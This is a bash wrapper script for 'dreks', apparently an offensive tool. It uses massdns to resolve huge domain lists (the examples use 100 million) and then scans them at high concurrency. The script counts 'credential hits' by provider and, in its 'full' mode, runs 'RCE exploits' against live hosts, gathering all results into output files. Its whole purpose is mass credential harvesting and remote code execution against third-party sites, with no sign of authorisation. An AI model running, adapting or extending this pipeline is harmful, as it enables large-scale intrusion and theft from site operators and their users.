#!/usr/bin/env bash
# =============================================================================
# dreks-massdns.sh — Ultra-scale scanner with massdns DNS pre-resolution
# =============================================================================
# Usage:  ./scripts/dreks-massdns.sh [OPTIONS] <domains.txt>
# Options:
#   -c, --concurrency NUM      HTTP concurrency (default: 5000)
#   -C, --chunk-size NUM       Domains per batch (default: 50000)
#   -r, --resolvers FILE       Resolvers file (default: /etc/massdns_resolvers.txt)
#   -o, --output DIR           Output dir (default: ./dreks_output)
#   -m, --mode MODE            scan|full (default: scan)
#   --exploit-concurrency N    M2 concurrency (default: 200)
#   --exploit-timeout N        M2 timeout seconds (default: 8)
#   -t, --timeout NUM          HTTP timeout (default: 5)
#   --min-confidence LEVEL     low|medium|high (default: medium)
#   -j, --jobs NUM             Parallel chunks (default: 1)
#   -h, --help                 This help
#
# Prerequisites:
#   massdns:  apt install massdns
#   dreks:    cargo build --release
#   resolvers: curl -o /etc/massdns_resolvers.txt \
#     https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt
#
# Example (100M domains):
#   ./scripts/dreks-massdns.sh -c 10000 -C 50000 domains_100M.txt
# Example (full pipeline with M2):
#   ./scripts/dreks-massdns.sh -m full --exploit-concurrency 300 domains.txt

set -euo pipefail

CONCURRENCY=5000; CHUNK_SIZE=50000
RESOLVERS="/etc/massdns_resolvers.txt"; OUTPUT_DIR="./dreks_output"
MODE="scan"; EXPLOIT_CONCURRENCY=200; EXPLOIT_TIMEOUT=8
HTTP_TIMEOUT=5; MIN_CONFIDENCE="medium"; PARALLEL_JOBS=1
LOG_LEVEL="warn"; INPUT_FILE=""
DREKS_BIN="${DREKS_BIN:-./target/release/dreks}"
MASSDNS_BIN="${MASSDNS_BIN:-massdns}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
log()   { echo -e "${CYAN}[$(date '+%H:%M:%S')]${NC} $*"; }
ok()    { echo -e "${GREEN}[ok]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
die()   { echo -e "${RED}[x]${NC} $*" >&2; exit 1; }

usage() { grep '^#' "$0" | grep -v '^#!/' | sed 's/^# \{0,2\}//'; exit 0; }

while [[ $# -gt 0 ]]; do
    case "$1" in
        -c|--concurrency)       CONCURRENCY="$2"; shift 2 ;;
        -C|--chunk-size)        CHUNK_SIZE="$2"; shift 2 ;;
        -r|--resolvers)         RESOLVERS="$2"; shift 2 ;;
        -o|--output)            OUTPUT_DIR="$2"; shift 2 ;;
        -m|--mode)              MODE="$2"; shift 2 ;;
        --exploit-concurrency)  EXPLOIT_CONCURRENCY="$2"; shift 2 ;;
        --exploit-timeout)      EXPLOIT_TIMEOUT="$2"; shift 2 ;;
        -t|--timeout)           HTTP_TIMEOUT="$2"; shift 2 ;;
        --min-confidence)       MIN_CONFIDENCE="$2"; shift 2 ;;
        -j|--jobs)              PARALLEL_JOBS="$2"; shift 2 ;;
        --log-level)            LOG_LEVEL="$2"; shift 2 ;;
        -h|--help)              usage ;;
        -*)                     die "Unknown: $1" ;;
        *)                      INPUT_FILE="$1"; shift ;;
    esac
done

[[ -z "$INPUT_FILE" ]] && die "Input file required"
[[ ! -f "$INPUT_FILE" ]] && die "File not found: $INPUT_FILE"

check_deps() {
    command -v "$MASSDNS_BIN" &>/dev/null || die "massdns not found. apt install massdns"
    [[ -f "$DREKS_BIN" ]] || command -v "$DREKS_BIN" &>/dev/null || \
        die "dreks not found at $DREKS_BIN. cargo build --release"
    if [[ ! -f "$RESOLVERS" ]]; then
        warn "Downloading resolvers to $RESOLVERS..."
        curl -sSL -o "$RESOLVERS" \
            "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt"
    fi
    ok "massdns: $(massdns --version 2>&1 | head -1 || echo 'ok')"
    ok "dreks: $DREKS_BIN | resolvers: $(wc -l < "$RESOLVERS") entries"
}

process_chunk() {
    local chunk_file="$1"
    local id="${chunk_file##*chunk_}"
    local resolved="$OUTPUT_DIR/resolved/r_${id}.txt"
    local hits_file="$OUTPUT_DIR/hits/hits_${id}.jsonl"
    local exploit_file="$OUTPUT_DIR/exploits/exp_${id}.jsonl"

    local n=$(wc -l < "$chunk_file")
    log "[$id] $n domains — massdns resolving..."

    # Step 1: massdns pre-resolve
    "$MASSDNS_BIN" -r "$RESOLVERS" -t A -o S --flush --quiet "$chunk_file" \
        > "$resolved" 2>/dev/null || true
    local live=$(wc -l < "$resolved")
    log "[$id] $live/$n resolved — dreks scanning..."

    [[ $live -eq 0 ]] && { warn "[$id] 0 resolved, skip"; rm -f "$chunk_file" "$resolved"; return; }

    # Step 2: dreks --skip-dns HTTP scan
    local args=(
        --input "$resolved"
        --skip-dns
        --concurrency "$CONCURRENCY"
        --timeout "$HTTP_TIMEOUT"
        --min-confidence "$MIN_CONFIDENCE"
        --output "$hits_file"
        --log-level "$LOG_LEVEL"
    )
    [[ "$MODE" == "full" ]] && args+=(
        --mode full
        --exploit-output "$exploit_file"
        --exploit-concurrency "$EXPLOIT_CONCURRENCY"
        --exploit-timeout "$EXPLOIT_TIMEOUT"
    )
    "$DREKS_BIN" "${args[@]}" 2>>"$OUTPUT_DIR/logs/dreks_${id}.log"

    local hits=0; [[ -f "$hits_file" ]] && hits=$(wc -l < "$hits_file")
    local expl=0; [[ -f "$exploit_file" ]] && expl=$(wc -l < "$exploit_file")
    ok "[$id] hits=$hits exploit=$expl"

    rm -f "$chunk_file" "$resolved"
}

aggregate() {
    log "Aggregating results..."
    local all_hits="$OUTPUT_DIR/all_hits.jsonl"
    local all_expl="$OUTPUT_DIR/all_exploits.jsonl"
    cat "$OUTPUT_DIR/hits/"*.jsonl > "$all_hits" 2>/dev/null || touch "$all_hits"
    cat "$OUTPUT_DIR/exploits/"*.jsonl > "$all_expl" 2>/dev/null || touch "$all_expl"
    local h=$(wc -l < "$all_hits"); local e=$(wc -l < "$all_expl")

    echo -e "\n${BOLD}=== Pipeline Complete ===${NC}"
    echo -e "  Credential hits: ${GREEN}$h${NC}"
    echo -e "  RCE exploits:    ${GREEN}$e${NC}"
    echo -e "  Output dir:      ${CYAN}$OUTPUT_DIR${NC}"

    [[ $h -gt 0 ]] && python3 -c "
import json, collections
c = collections.Counter()
for l in open('$all_hits'):
    try: c[json.loads(l).get('provider','?')] += 1
    except: pass
print('\nTop providers:')
[print(f'  {k:<20} {v}') for k,v in c.most_common(10)]
" 2>/dev/null || true
}

main() {
    check_deps
    mkdir -p "$OUTPUT_DIR"/{chunks,resolved,hits,exploits,logs}
    
    local total=$(wc -l < "$INPUT_FILE")
    local chunks=$(( (total + CHUNK_SIZE - 1) / CHUNK_SIZE ))
    local http_rate=$(( CONCURRENCY / HTTP_TIMEOUT ))
    local alive_per=$(( CHUNK_SIZE * 40 / 100 ))
    local est=$(( chunks * (1 + alive_per / http_rate) / PARALLEL_JOBS ))

    echo -e "${BOLD}dreks-massdns | $total domains | $chunks chunks | est ~${est}s${NC}"

    log "Splitting into chunks of $CHUNK_SIZE..."
    split -l "$CHUNK_SIZE" --numeric-suffixes=1 --suffix-length=5 \
        "$INPUT_FILE" "$OUTPUT_DIR/chunks/chunk_"

    local t0=$(date +%s)
    local done=0
    local running=0

    for chunk in "$OUTPUT_DIR/chunks/"chunk_*; do
        if [[ $PARALLEL_JOBS -le 1 ]]; then
            process_chunk "$chunk"; ((done++))
            local el=$(( $(date +%s) - t0 ))
            local eta=$(( el * (chunks - done) / done ))
            log "Progress: $done/$chunks | ${el}s elapsed | ~${eta}s remaining"
        else
            process_chunk "$chunk" &
            ((running++)); ((done++))
            [[ $running -ge $PARALLEL_JOBS ]] && { wait -n 2>/dev/null || wait; ((running--)); }
        fi
    done
    [[ $PARALLEL_JOBS -gt 1 ]] && wait

    aggregate
    ok "Total time: $(( $(date +%s) - t0 ))s"
}

main
